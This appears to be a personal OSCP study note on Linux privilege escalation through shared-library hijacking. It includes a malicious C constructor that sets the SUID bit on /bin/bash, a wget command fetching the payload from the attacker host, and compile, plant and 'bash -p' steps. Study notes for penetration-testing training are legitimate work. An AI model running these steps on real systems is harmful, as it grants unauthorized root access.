Library path / .so 

When a program needs a shared library (`.so` file), the loader (`ld.so`) searches in this order:

1. `LD_LIBRARY_PATH` (if set)
2. `RUNPATH` / `RPATH` (embedded in the binary, if present)
3. `/etc/ld.so.cache`
4. Default system paths like:
    - `/lib`
    - `/usr/lib`
    - `/lib64`
    - `/usr/lib64`

If 
PATH : /usr/local/lib/utils,

earlier path

/usr/local/lib/dev wins

👉 **Within any list, directories are searched left → right. First match wins.**

Find writeable directories
```
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```

---

On KALI ATTACKER, creating a malicious C script that will set the SUID bit of /bin/bash.

PrivEsc.c
```powershell
#include <stdio.h>  
#include <stdlib.h>  
  
static void inject() __attribute__((constructor));  
  
void inject() {  
system("chmod +s /bin/bash");  
}
```

👉 Note : This only works if:

- your `.so` is successfully loaded by a privileged process
- the process actually triggers dynamic library loading
- the environment allows `system()` calls

```
python3 -m http.server 80
```

On VICTIM HOST

Grab the .c file
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `cd /tmp && wget http://${KaliIP}/PrivEsc.c`;

dv.paragraph("```bash\n" + command + "\n```");
```

Compile the .c file
```
gcc -fPIC -shared PrivEsc.c -o [name of target file].so
```

Move the file into correct directory
```
cp [name of target file].so /usr/local/lib/dev/
```

---

Check if SUID bit of /bin/bash has been set

```
ls -la /bin/bash
```

if -s- perms show up in permissions, root.

```
/bin/bash -p
```

---